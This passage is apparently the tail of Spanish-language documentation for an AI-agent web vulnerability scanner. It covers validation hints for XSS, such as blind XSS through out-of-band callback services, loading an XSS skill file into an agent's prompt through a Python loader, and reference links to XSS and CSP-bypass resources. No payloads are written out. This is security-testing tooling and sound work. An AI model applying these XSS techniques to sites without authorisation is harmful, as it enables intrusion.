- Blind XSS: Usar servidor OOB (xsshunter, interactsh)
- Interact with page: Probar botones/menús después de inyectar
- Vision Model: Buscar ventanas de `alert` o overlays

### Carga Dinámica en DASTySAST

Cuando el DASTySASTAgent detecta una posible vulnerabilidad XSS:

1. **Durante analysis approaches**: Carga `xss.md` automáticamente
2. **En el prompt**: Inyecta el contenido en sección "SPECIALIZED KNOWLEDGE"
3. **Durante skeptical review**: Usa `scoring_guide` y `false_positives` para evaluación

```python
from bugtrace.agents.skills.loader import get_skill_content, get_scoring_guide

# Cargar skill completa
xss_skill = get_skill_content("XSS")

# Cargar solo scoring guide
scoring = get_scoring_guide("XSS")
```

### Documentación Completa

Para más detalles sobre el sistema de skills:
- **Documentación**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md)
- **Loader**: `bugtrace/agents/skills/loader.py`
- **XSS Skill**: `bugtrace/agents/skills/vulnerabilities/xss.md`

---

## Referencias

- **XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- **mXSS Paper**: https://cure53.de/fp170.pdf
- **CSP Bypass**: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- **DOM XSS**: `technical_specs/XSS_PIPELINE_VALIDATION.md`
- **CDP Integration**: `agents/agentic_validator.md`
- **Skills System**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md)

---

*Última actualización: 2026-02-02*
*Versión: 2.0.0 (Phoenix Edition)*
